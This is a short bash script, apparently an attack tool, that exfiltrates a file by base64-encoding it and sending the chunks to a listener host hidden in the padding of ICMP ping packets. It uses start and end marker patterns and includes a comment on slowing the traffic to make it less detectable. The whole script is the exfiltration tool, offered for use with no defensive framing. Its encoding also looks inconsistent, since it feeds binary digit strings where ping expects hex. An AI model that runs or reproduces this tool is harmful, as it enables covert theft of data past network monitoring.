#!/bin/bash
B64=$(base64 $1)
##CONVERT THE INPUT TO 16BIT ARRAY, CAUSE
##THE PING PACKET TAKES UP TO 16 PADDING BITS
BINARRAY=($(xxd -b <<< $B64 | sed -e 's/^.*: //g' -e 's/  .*$//g'))

##LISTENER ADDRESS
HOST=$2

ping -p "beef15f00d1100FF" $HOST -c 1
COUNTER=0

LENGTH=${#BINARRAY[@]}
##THE TABLE LENGTH NEEDS TO BE DIVISBLE BY 4
##DIV GETS THE VALUE OF MISSING CELLS
##THE CELLS ARE APPENDED TO THE TABLE
##WITH THE CONTENT OF deadbeef, WHICH MARKS
##THE END OF THE CAPTURED PACKET SEQUENCE
##FOR THE PRECEIVER
DIV=$(($LENGTH%4))
DIV=$((4-DIV))
FILLCOUNTER=0

if (( FILLCOUNTER < DIV ))
then
        while (( FILLCOUNTER < DIV ))
        do
                BINARRAY=("${BINARRAY[@]}" "deadbeef")
                ((FILLCOUNTER++))
        done
else
        BINARRAY=("${BINARRAY[@]}" "deadbeef" "deadbeef" "deadbeef" "deadbeef")
fi

for bin in ${BINARRAY[@]}
do
        BUFFER=$BUFFER$bin
        ((COUNTER++))
        ##SEND OUT THE DATA VIA PING EVERY 16 BITS (COUNTER=4)
        if [ $COUNTER -gt 3 ]
        then
                ping -p $BUFFER $HOST -c 1
                ##IF YOU WANT TO WAIT BETWEEN PACKETS TO
                ##MAKE THE TRAFFIC LESS DETECTABLE
                #sleep 3
                BUFFER=""
                COUNTER=0
        fi
done
